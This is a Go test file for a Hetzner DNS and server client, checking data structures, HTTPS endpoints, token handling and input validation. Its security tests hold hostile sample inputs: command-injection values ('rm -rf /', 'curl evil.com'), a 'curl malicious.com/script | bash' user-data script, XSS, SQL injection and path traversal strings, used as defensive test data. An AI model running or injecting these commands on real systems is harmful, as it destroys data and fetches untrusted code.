package hetzner

import (
	"context"
	"os"
	"strings"
	"testing"

	"github.com/CodeMonkeyCybersecurity/eos/pkg/eos_io"
	"github.com/stretchr/testify/assert"
	"go.uber.org/zap"
)

// TestHetznerTypes tests Hetzner data structures
func TestHetznerTypes(t *testing.T) {
	t.Run("dns_record_structure", func(t *testing.T) {
		// Test DNSRecord structure
		record := DNSRecord{
			ID:     "test-id",
			Value:  "192.168.1.1",
			TTL:    3600,
			Type:   "A",
			Name:   "test.example.com",
			ZoneID: "zone-123",
		}

		// Verify structure integrity
		assert.Equal(t, "test-id", record.ID)
		assert.Equal(t, "192.168.1.1", record.Value)
		assert.Equal(t, 3600, record.TTL)
		assert.Equal(t, "A", record.Type)
		assert.Equal(t, "test.example.com", record.Name)
		assert.Equal(t, "zone-123", record.ZoneID)
	})

	t.Run("dns_zone_structure", func(t *testing.T) {
		// Test DNSZone structure
		zone := DNSZone{
			ID:   "zone-123",
			Name: "example.com",
			TTL:  3600,
		}

		// Verify structure integrity
		assert.Equal(t, "zone-123", zone.ID)
		assert.Equal(t, "example.com", zone.Name)
		assert.Equal(t, 3600, zone.TTL)
	})

	t.Run("server_spec_structure", func(t *testing.T) {
		// Test ServerSpec structure
		serverSpec := ServerSpec{
			Name:        "test-server",
			Image:       "ubuntu-20.04",
			Type:        "cx11",
			Location:    "nbg1",
			SSHKeys:     []string{"key1", "key2"},
			UserData:    "#!/bin/bash\necho 'Hello World'",
			Labels:      map[string]string{"env": "test"},
			FirewallIDs: []int{1, 2, 3},
		}

		// Verify structure integrity
		assert.Equal(t, "test-server", serverSpec.Name)
		assert.Equal(t, "ubuntu-20.04", serverSpec.Image)
		assert.Equal(t, "cx11", serverSpec.Type)
		assert.Equal(t, "nbg1", serverSpec.Location)
		assert.Len(t, serverSpec.SSHKeys, 2)
		assert.Contains(t, serverSpec.UserData, "Hello World")
		assert.Equal(t, "test", serverSpec.Labels["env"])
		assert.Len(t, serverSpec.FirewallIDs, 3)
	})

	t.Run("primary_server_structure", func(t *testing.T) {
		// Test PrimaryServer structure
		primaryServer := PrimaryServer{
			ID:      "primary-123",
			Address: "ns1.example.com",
			Port:    53,
			ZoneID:  "zone-123",
		}

		// Verify structure integrity
		assert.Equal(t, "primary-123", primaryServer.ID)
		assert.Equal(t, "ns1.example.com", primaryServer.Address)
		assert.Equal(t, 53, primaryServer.Port)
		assert.Equal(t, "zone-123", primaryServer.ZoneID)
	})
}

// TestHetznerConstants tests Hetzner API constants
func TestHetznerConstants(t *testing.T) {
	t.Run("api_urls_security", func(t *testing.T) {
		// Test that API URLs use HTTPS
		urls := []string{
			HetznerDNSAPIBase,
			HetznerDNSRecordsURL,
			HetznerDNSZonesURL,
		}

		for _, url := range urls {
			assert.True(t, strings.HasPrefix(url, "https://"),
				"API URL should use HTTPS: %s", url)
			assert.Contains(t, url, "hetzner.com",
				"URL should be from Hetzner domain: %s", url)
		}
	})

	t.Run("dns_base_url_validation", func(t *testing.T) {
		assert.Equal(t, "https://dns.hetzner.com/api/v1", HetznerDNSAPIBase)
		assert.True(t, strings.HasPrefix(HetznerDNSAPIBase, "https://"))
	})

	t.Run("records_base_url_validation", func(t *testing.T) {
		assert.Equal(t, "https://dns.hetzner.com/api/v1/records", HetznerDNSRecordsURL)
		assert.True(t, strings.HasPrefix(HetznerDNSRecordsURL, "https://"))
	})

	t.Run("zones_base_url_validation", func(t *testing.T) {
		assert.Equal(t, "https://dns.hetzner.com/api/v1/zones", HetznerDNSZonesURL)
		assert.True(t, strings.HasPrefix(HetznerDNSZonesURL, "https://"))
	})
}

// TestHetznerTokenSecurity tests token handling security
func TestHetznerTokenSecurity(t *testing.T) {
	ctx := context.Background()
	logger := zap.NewNop()
	rc := &eos_io.RuntimeContext{
		Ctx: ctx,
		Log: logger,
	}

	t.Run("token_environment_variable", func(t *testing.T) {
		// Store original token
		originalToken := os.Getenv("HCLOUD_TOKEN")
		originalHetznerToken := os.Getenv("HETZNER_TOKEN")

		defer func() {
			// Restore original tokens
			if originalToken != "" {
				_ = os.Setenv("HCLOUD_TOKEN", originalToken)
			} else {
				_ = os.Unsetenv("HCLOUD_TOKEN")
			}
			if originalHetznerToken != "" {
				_ = os.Setenv("HETZNER_TOKEN", originalHetznerToken)
			} else {
				_ = os.Unsetenv("HETZNER_TOKEN")
			}
		}()

		// Test with valid token
		_ = os.Setenv("HCLOUD_TOKEN", "test-token-12345")

		// Test token is read correctly
		token := os.Getenv("HCLOUD_TOKEN")
		assert.Equal(t, "test-token-12345", token)

		// Clear token
		_ = os.Unsetenv("HCLOUD_TOKEN")
		token = os.Getenv("HCLOUD_TOKEN")
		assert.Empty(t, token)
	})

	t.Run("ssh_key_operations_require_token", func(t *testing.T) {
		// Store original token
		originalToken := os.Getenv("HCLOUD_TOKEN")
		defer func() {
			if originalToken != "" {
				_ = os.Setenv("HCLOUD_TOKEN", originalToken)
			} else {
				_ = os.Unsetenv("HCLOUD_TOKEN")
			}
		}()

		// Clear token to test error handling
		_ = os.Unsetenv("HCLOUD_TOKEN")

		// All SSH key operations should handle missing token
		err := GetAllSshKeys(rc)
		assert.Error(t, err, "Should fail without token")

		err = CreateSshKey(rc, "test-key", "ssh-rsa AAAAB3...")
		assert.Error(t, err, "Should fail without token")

		err = GetAnSshKey(rc, 123)
		assert.Error(t, err, "Should fail without token")

		err = UpdateAnSshKey(rc, 123, "new-name")
		assert.Error(t, err, "Should fail without token")

		err = DeleteAnSshKey(rc, 123)
		assert.Error(t, err, "Should fail without token")
	})

	t.Run("token_validation", func(t *testing.T) {
		// Test token format validation (basic checks)
		validTokens := []string{
			"abcdef1234567890abcdef1234567890",
			"ABCDEF1234567890ABCDEF1234567890",
			"1234567890abcdefABCDEF1234567890",
		}

		invalidTokens := []string{
			"",                  // Empty
			"short",             // Too short
			"invalid-chars-!@#", // Invalid characters
			"spaces in token",   // Spaces
		}

		for _, token := range validTokens {
			// Valid tokens should be accepted (basic format check)
			assert.NotEmpty(t, token)
			assert.Len(t, token, 32) // Assuming 32-char tokens
		}

		for _, token := range invalidTokens {
			// Invalid tokens should be rejected
			if token == "" {
				assert.Empty(t, token)
			} else if len(token) < 10 {
				assert.Less(t, len(token), 10)
			} else {
				// Check for invalid characters or patterns
				assert.True(t, strings.Contains(token, " ") ||
					strings.ContainsAny(token, "!@#$%^&*()"))
			}
		}
	})
}

// TestSSHKeySecurity tests SSH key handling security
func TestSSHKeySecurity(t *testing.T) {
	ctx := context.Background()
	logger := zap.NewNop()
	_ = &eos_io.RuntimeContext{
		Ctx: ctx,
		Log: logger,
	}

	t.Run("ssh_key_name_validation", func(t *testing.T) {
		// Store original token and set a test token
		originalToken := os.Getenv("HCLOUD_TOKEN")
		_ = os.Setenv("HCLOUD_TOKEN", "test-token-12345")
		defer func() {
			if originalToken != "" {
				_ = os.Setenv("HCLOUD_TOKEN", originalToken)
			} else {
				_ = os.Unsetenv("HCLOUD_TOKEN")
			}
		}()

		// Test SSH key name validation
		validNames := []string{
			"my-ssh-key",
			"production-key-1",
			"user.key",
			"server_key_2024",
		}

		invalidNames := []string{
			"",                       // Empty
			"key with spaces",        // Spaces
			"key/with/slashes",       // Slashes
			"key@with@symbols",       // Special chars
			strings.Repeat("a", 100), // Too long
		}

		for _, name := range validNames {
			// Valid names should be properly formatted
			assert.NotEmpty(t, name)
			assert.NotContains(t, name, " ")
			assert.Less(t, len(name), 64) // Reasonable length limit
		}

		for _, name := range invalidNames {
			// Invalid names should be caught
			if name == "" {
				assert.Empty(t, name)
			} else if strings.Contains(name, " ") {
				assert.Contains(t, name, " ")
			} else if len(name) > 64 {
				assert.Greater(t, len(name), 64)
			}
		}
	})

	t.Run("ssh_public_key_format_validation", func(t *testing.T) {
		// Test SSH public key format validation
		validKeys := []string{
			"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7... user@host",
			"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI... user@host",
			"ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbml... user@host",
		}

		invalidKeys := []string{
			"",                      // Empty
			"not-a-ssh-key",         // Invalid format
			"ssh-rsa invalidbase64", // Invalid base64
			"BEGIN RSA PRIVATE KEY", // Private key (security issue)
			"password123",           // Plain text
		}

		for _, key := range validKeys {
			// Valid SSH keys should start with algorithm identifier
			assert.True(t, strings.HasPrefix(key, "ssh-") ||
				strings.HasPrefix(key, "ecdsa-"))
			assert.Contains(t, key, " ")    // Should have spaces separating parts
			assert.Greater(t, len(key), 50) // Should be reasonably long
		}

		for _, key := range invalidKeys {
			// Invalid keys should be caught
			if key == "" {
				assert.Empty(t, key)
			} else if strings.Contains(key, "PRIVATE") {
				assert.Contains(t, key, "PRIVATE")
			} else {
				assert.False(t, strings.HasPrefix(key, "ssh-") && len(key) > 50)
			}
		}
	})

	t.Run("ssh_key_labels_security", func(t *testing.T) {
		// Test SSH key labels for security
		labels := map[string]string{
			"environment": "prod",
			"owner":       "team-devops",
			"purpose":     "server-access",
		}

		// Verify labels are properly set
		assert.Equal(t, "prod", labels["environment"])
		assert.Equal(t, "team-devops", labels["owner"])
		assert.Equal(t, "server-access", labels["purpose"])

		// Test malicious labels
		maliciousLabels := map[string]string{
			"script": "<script>alert('xss')</script>",
			"inject": "'; DROP TABLE keys; --",
			"path":   "../../../etc/passwd",
		}

		// Malicious labels should be stored as-is but handled safely
		for key, value := range maliciousLabels {
			assert.NotEmpty(t, key)
			assert.NotEmpty(t, value)
			// In real implementation, would sanitize or validate
		}
	})
}

// TestDNSRecordSecurity tests DNS record security
func TestDNSRecordSecurity(t *testing.T) {
	t.Run("dns_record_validation", func(t *testing.T) {
		// Test DNS record validation
		validRecords := []DNSRecord{
			{
				Type:   "A",
				Name:   "www.example.com",
				Value:  "192.168.1.1",
				TTL:    3600,
				ZoneID: "zone-123",
			},
			{
				Type:   "AAAA",
				Name:   "ipv6.example.com",
				Value:  "2001:db8::1",
				TTL:    7200,
				ZoneID: "zone-123",
			},
			{
				Type:   "CNAME",
				Name:   "alias.example.com",
				Value:  "target.example.com",
				TTL:    1800,
				ZoneID: "zone-123",
			},
		}

		for _, record := range validRecords {
			// Valid records should have required fields
			assert.NotEmpty(t, record.Type)
			assert.NotEmpty(t, record.Name)
			assert.NotEmpty(t, record.Value)
			assert.Greater(t, record.TTL, 0)
			assert.NotEmpty(t, record.ZoneID)
		}
	})

	t.Run("dns_record_type_validation", func(t *testing.T) {
		// Test DNS record type validation
		validTypes := []string{"A", "AAAA", "CNAME", "MX", "TXT", "NS", "PTR", "SRV"}
		invalidTypes := []string{"", "INVALID", "DROP", "SELECT", "<script>"}

		for _, recordType := range validTypes {
			assert.Contains(t, validTypes, recordType)
			assert.True(t, len(recordType) >= 1 && len(recordType) <= 5)
		}

		for _, recordType := range invalidTypes {
			if recordType == "" {
				assert.Empty(t, recordType)
			} else {
				assert.False(t, contains(validTypes, recordType))
			}
		}
	})

	t.Run("dns_value_injection_prevention", func(t *testing.T) {
		// Test DNS value injection prevention
		maliciousValues := []string{
			"192.168.1.1; rm -rf /",
			"example.com && curl evil.com",
			"<script>alert('xss')</script>",
			"'; DROP TABLE dns_records; --",
			"../../../etc/passwd",
		}

		for _, value := range maliciousValues {
			record := DNSRecord{
				Type:   "A",
				Name:   "test.example.com",
				Value:  value,
				TTL:    3600,
				ZoneID: "zone-123",
			}

			// Malicious values should be stored but not executed
			assert.Equal(t, value, record.Value)
			// In real implementation, would validate/sanitize DNS values
		}
	})

	t.Run("ttl_validation", func(t *testing.T) {
		// Test TTL validation
		validTTLs := []int{60, 300, 3600, 86400, 604800}
		invalidTTLs := []int{-1, 0, 2147483648} // Negative, zero, overflow

		for _, ttl := range validTTLs {
			assert.Greater(t, ttl, 0)
			assert.LessOrEqual(t, ttl, 2147483647) // Max int32
		}

		for _, ttl := range invalidTTLs {
			assert.True(t, ttl <= 0 || ttl > 2147483647)
		}
	})
}

// TestZoneSecurityValidation tests DNS zone security
func TestZoneSecurityValidation(t *testing.T) {
	t.Run("zone_name_validation", func(t *testing.T) {
		// Test zone name validation
		validZones := []string{
			"example.com",
			"sub.example.com",
			"test-domain.org",
			"my-site.co.uk",
		}

		invalidZones := []string{
			"",                 // Empty
			"invalid..domain",  // Double dots
			".starts-with-dot", // Starts with dot
			"ends-with-dot.",   // Ends with dot (might be valid)
			"toolong" + strings.Repeat("a", 250) + ".com", // Too long
			"spaces in domain.com",                        // Spaces
		}

		for _, zone := range validZones {
			// Valid zones should follow domain name rules
			assert.NotEmpty(t, zone)
			assert.NotContains(t, zone, " ")
			assert.NotContains(t, zone, "..")
			assert.False(t, strings.HasPrefix(zone, "."))
			assert.Less(t, len(zone), 253) // Max domain length
		}

		for _, zone := range invalidZones {
			// Invalid zones should be caught
			isInvalid := zone == "" ||
				strings.Contains(zone, "..") ||
				strings.Contains(zone, " ") ||
				strings.HasPrefix(zone, ".") ||
				len(zone) > 253

			assert.True(t, isInvalid, "Zone should be invalid: %s", zone)
		}
	})

	t.Run("zone_ttl_validation", func(t *testing.T) {
		// Test zone TTL validation
		zone := DNSZone{
			Name: "example.com",
			TTL:  3600,
		}

		assert.Equal(t, "example.com", zone.Name)
		assert.Equal(t, 3600, zone.TTL)
		assert.Greater(t, zone.TTL, 0)
	})
}

// TestServerSpecSecurity tests server specification security
func TestServerSpecSecurity(t *testing.T) {
	t.Run("server_spec_validation", func(t *testing.T) {
		// Test server specification validation
		spec := ServerSpec{
			Name:        "web-server-1",
			Image:       "ubuntu-20.04",
			Type:        "cx11",
			Location:    "nbg1",
			SSHKeys:     []string{"my-key"},
			UserData:    "#!/bin/bash\napt update",
			Labels:      map[string]string{"env": "prod"},
			FirewallIDs: []int{1, 2},
		}

		// Verify server spec fields
		assert.NotEmpty(t, spec.Name)
		assert.NotEmpty(t, spec.Image)
		assert.NotEmpty(t, spec.Type)
		assert.NotEmpty(t, spec.Location)
		assert.NotEmpty(t, spec.SSHKeys)
		assert.NotEmpty(t, spec.UserData)
		assert.NotEmpty(t, spec.Labels)
		assert.NotEmpty(t, spec.FirewallIDs)
	})

	t.Run("user_data_security", func(t *testing.T) {
		// Test user data security
		safeUserData := "#!/bin/bash\napt update && apt upgrade -y"
		unsafeUserData := "#!/bin/bash\ncurl malicious.com/script | bash"

		// Both should be stored but unsafe should be flagged in real implementation
		assert.Contains(t, safeUserData, "apt update")
		assert.Contains(t, unsafeUserData, "curl")

		// In real implementation, would validate user data for security
	})

	t.Run("ssh_keys_validation", func(t *testing.T) {
		// Test SSH keys validation in server spec
		spec := ServerSpec{
			SSHKeys: []string{"key1", "key2", "key3"},
		}

		assert.Len(t, spec.SSHKeys, 3)
		for _, key := range spec.SSHKeys {
			assert.NotEmpty(t, key)
		}
	})

	t.Run("firewall_ids_validation", func(t *testing.T) {
		// Test firewall IDs validation
		spec := ServerSpec{
			FirewallIDs: []int{1, 2, 3, 999},
		}

		assert.Len(t, spec.FirewallIDs, 4)
		for _, id := range spec.FirewallIDs {
			assert.Greater(t, id, 0) // IDs should be positive
		}
	})
}

// Helper function for testing
func contains(slice []string, item string) bool {
	for _, s := range slice {
		if s == item {
			return true
		}
	}
	return false
}
